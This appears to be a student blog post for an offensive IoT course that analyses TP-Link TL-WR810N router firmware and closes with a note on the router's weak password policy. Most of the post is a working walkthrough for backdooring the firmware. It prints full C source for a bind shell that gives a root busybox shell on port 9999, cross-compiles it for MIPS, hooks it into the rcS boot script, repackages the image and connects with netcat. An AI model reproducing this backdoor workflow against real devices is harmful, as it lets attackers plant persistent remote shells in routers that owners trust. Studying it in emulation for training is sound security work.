---
layout: post
title: "TP-Link TL-WR810N Firmware Analysis"
description: 'For one of the projects for the Offensive Internet Of Things Exploitation final exam I decided to try to analyze the firmware for the TP-Link TL-WR810N'
tags: [firmware, analysis, tp-link]
---

This blog post has been created for completing the requirements of the
SecurityTube Offensive Internet of Things course.

[Offensive Internet Of Things Exploitation](http://www.securitytube-training.com/online-courses/offensive-internet-of-things-exploitation/index.html)

Student ID: IoTE- 778

## Overview

For one of the projects for the Offensive Internet Of Things
Exploitation final exam I decided to try to analyze the firmware for
the
[TP-Link TL-WR810N Router](http://www.tp-link.com/us/download/TL-WR810N.html#Firmware).


![TL-WR810N Router](/assets/Firmware/tplinkwr810n.png)
![TL-WR810N Router Firmware Download](/assets/Firmware/tplinkwr810nfirmwaredownload.png)

My goals for this project were to:

- Successfully extract the filesystem from the firmware
- Re-package the firmware with a backdoor corresponding to the correct
  architecture
- Emulate the firmware using Firmadyne
- Identify any interesting security issues

## Filesystem Extraction

Filesystem extraction was completed easy enough using the
[firmware-mod-kit](https://github.com/mirror/firmware-mod-kit). I
initially extracted the firmware using binwalk but had issues when
trying to re-build the firmware after manipulating it.

`sudo ./extract-firmware.sh wr810nv2_us_3_16_9_up_boot\(160509\).bin`


	oit@ubuntu:~/tools/firmware-mod-kit$ sudo ./extract-firmware.sh wr810nv2_us_3_16_9_up_boot\(160509\).bin 
	Firmware extraction successful!

	.. snip ..

	Firmware parts can be found in '/home/oit/tools/firmware-mod-kit/wr810nv2_us_3_16_9_up_boot(160509)/*'
	oit@ubuntu:~/tools/firmware-mod-kit$


![Extract Filesystem for TL-WR810N Router Firmware](/assets/Firmware/ExtractTplinkwr810n.png)

From the extraction output we learn that:

- That the U-Boot bootloader is being used
- The file system is big endian
- The CPU is a MIPS architecture
- The Squashfs is being used

To verify the endianess we can use `readelf`:


	$ readelf -a bin/busybox | less

	ELF Header:
	  Magic:   7f 45 4c 46 01 02 01 00 00 00 00 00 00 00 00 00
	  Class:                             ELF32
	  Data:                              2's complement, big endian
	  Version:                           1 (current)
	  OS/ABI:                            UNIX - System V
	  ABI Version:                       0
	  Type:                              EXEC (Executable file)
	  Machine:                           MIPS R3000
	  Version:                           0x1
	  Entry point address:               0x404500
	  Start of program headers:          52 (bytes into file)
	  Start of section headers:          0 (bytes into file)
	  Flags:                             0x70001007, noreorder, pic, cpic, o32, mips32r2
	  Size of this header:               52 (bytes)
	  Size of program headers:           32 (bytes)
	  Number of program headers:         9
	  Size of section headers:           0 (bytes)
	  Number of section headers:         0
	  Section header string table index: 0



This information will be useful for creating a backdoor and emulating
the firmware later.




## Re-package The Firmware With A Backdoor

Now that we have successfully extracted the firmware, the next step is
to re-package the firmware with a backdoor corresponding to the
correct architecture. To do this we will first need to:

- Find a backdoor that we want to incorporate
- Compile the backdoor under the correct achitecture (MIPS)
- Setup the firmware so that it starts the backdoor during the boot process
- Re-package the firmware
- Test that the backdoor actually works


### Find A Backdoor To Incorporate

The IoT course provides an example backdoor c program that we will use
for this exercise. The backdoor is the following:

{% highlight c %}

/* Bindshell for Embedded system running Busybox
Author - Vivek Ramachandran
http://pentesteracademy.com
http://securitytube-training.com
http://securitytube.net

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define SERVER_PORT	9999
int main() {
	int serverfd, clientfd, server_pid, i = 0;
	char *banner = "[~] Welcome to @OsandaMalith's Bind Shell\n Welcome to Offensive IoT Exploitation\n";
	char *args[] = { "/bin/busybox", "sh", (char *) 0 };
	struct sockaddr_in server, client;
	socklen_t len;

	server.sin_family = AF_INET;
	server.sin_port = htons(SERVER_PORT);
	server.sin_addr.s_addr = INADDR_ANY;

	serverfd = socket(AF_INET, SOCK_STREAM, 0);
	bind(serverfd, (struct sockaddr *)&server, sizeof(server));
	listen(serverfd, 1);

    while (1) {
    	len = sizeof(struct sockaddr);
    	clientfd = accept(serverfd, (struct sockaddr *)&client, &len);
        server_pid = fork();
        if (server_pid) {
        	write(clientfd, banner,  strlen(banner));
	        for(; i <3 /*u*/; i++) dup2(clientfd, i);
	        execve("/bin/busybox", args, (char *) 0);
	        close(clientfd);
    	} close(clientfd);
    } return 0;
}

{% endhighlight %}

This bindshell binds to port 9999 and waits for a connection.

### Compile The Backdoor Under The Correct Architecture

Now that we know what backdoor we would like to use, we must compile
it for the MIPS architecture. We can do this using
[buildroot](https://buildroot.uclibc.org/). After copying the
bindshell into buildroot we statically compile with gcc using:

	./mips-buildroot-linux-uclibc-gcc bindshell.c -static -o bindshell

### Test That The Backdoor Works

We can test that the bindshell actuall works using qemu to emulate:

	sudo chroot . ./qemu-mips-static bindshell

And then nc to make the connection to port 9999:

	oit@ubuntu:~/tools$ nc -nv 127.0.0.1 9999
	Connection to 127.0.0.1 9999 port [tcp/*] succeeded!
	[~] Welcome to @OsandaMalith's Bind Shell

Running commands at this point doesn't actually work because
`bin/busybox` is not actually available.

Ok. It seems like the bindshell should work. Next we need to get it to
start when the firmware boots.

### Start The Backdoor During The Boot Process

After looking through the rootfs we come across the following:


	$ cat etc/rc.d/rcS

	.. snip ..

	#
	# Start Our Router Program
	#

	/usr/bin/httpd &

	.. snip ..


We can see that thr rcS script appears to start the httpd webserver
during the boot process. This seems like a good place to hook up our
bindshell. We will update the startup script with the following:


	$ cat etc/rc.d/rcS

	.. snip ..

	#
	# Start Our Router Program
	#


	/usr/bin/httpd &

	.. snip ..


	#
	# Start our Bindshell
	#

	/usr/bin/bindshell &


We will also need to move our bindshell into that location.

	$ sudo cp ../../bindshell usr/bin/
	$ ls -la usr/bin
	total 1704
	drwxr-xr-x 2 root root    4096 Jul  5 19:19 .
	drwxr-xr-x 4 root root    4096 May  8  2016 ..
	lrwxrwxrwx 1 root root      17 Jul  5 15:32 [ -> ../../bin/busybox
	lrwxrwxrwx 1 root root      17 Jul  5 15:32 arping -> ../../bin/busybox
	-rwxr-xr-x 1 root root   51266 Jul  5 19:19 bindshell
	-rwxr-xr-x 1 root root 1568272 May  8  2016 httpd
	-rwxr-xr-x 1 root root  114408 May  8  2016 lld2d
	lrwxrwxrwx 1 root root      17 Jul  5 15:32 logger -> ../../bin/busybox
	lrwxrwxrwx 1 root root      17 Jul  5 15:32 test -> ../../bin/busybox
	lrwxrwxrwx 1 root root      17 Jul  5 15:32 tftp -> ../../bin/busybox

After our startup script is modified and our binary is in place, we
can re-package our firmware.  We use the firmware-mode-kit build-firmware
script for this:

	$ sudo ./build-firmware.sh wr810nv2_us_3_16_9_up_boot\(160509\) -nopad -min

	.. snip ..

	Done
	Finished!
	New firmware image has been saved to:
	/home/oit/tools/firmware-mod-kit/wr810nv2_us_3_16_9_up_boot(160509)/new-firmware.bin


## Emulate The Modified Firmware with Firmadyne

The moment of truth is running the modified firmware using Firmadyne. We can use
the [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit)
to speed up the process:


	$ ./fat.py

	.. snip ..


	Warning: invalid flag 0x0000 of partition table 4 will be corrected by w(rite)
	mke2fs 1.42.9 (4-Feb-2014)
	Please check the makeImage function
	Everything is done for the image id 6
	Setting up the network connection
	Password for user firmadyne:
	qemu: terminating on signal 2 from pid 13694
	Querying database for architecture... mipseb
	Running firmware 6: terminating after 60 secs...
	Bad SWSTYLE=0x04
	Bad SWSTYLE=0x04
	Inferring network...
	Interfaces: [('br0', '192.168.0.254')]
	Done!

	Running the firmware finally :

Verify that the firmware is actually running in a browser:


![TL-WR810N Router](/assets/Firmware/tplinkwr810nFirmwareRunning.png)


Use nmap to see if our bindshell is listening:


	$ nmap 192.168.0.254

	Starting Nmap 6.40 ( http://nmap.org ) at 2017-07-06 09:18 PDT
	Nmap scan report for 192.168.0.254
	Host is up (0.0036s latency).
	Not shown: 997 closed ports
	PORT     STATE SERVICE
	80/tcp   open  http
	1900/tcp open  upnp
	9999/tcp open  abyss

	Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds


Connect to the bindshell using netcat:


	$ nc -nv 192.168.0.254 9999
	Connection to 192.168.0.254 9999 port [tcp/*] succeeded!
	[~] Welcome to @OsandaMalith's Bind Shell
	ls
	bin
	dev
	etc
	firmadyne
	lib
	linuxrc
	lost+found
	mnt
	proc
	root
	sbin
	sys
	tmp
	usr
	var
	web


## Identify Any Interesting Security Issues

I was unable to find anything very interesting but I did find one
thing. The minimum password requirements for this router are extremely
weak:

![TL-WR810N Router](/assets/Firmware/tplinkwr810nPasswordReq.png)

A password policy that supports a length of 1 is extremely weak. In
todays world a password of >12 is considered good and >14 even
better. The router firmware can't support a password any longer than
15 which is almost the recommended industry standard minimum.

Furthermore, this password policy does not enforce any complexity
requirements such as special characters, numbers, etc.
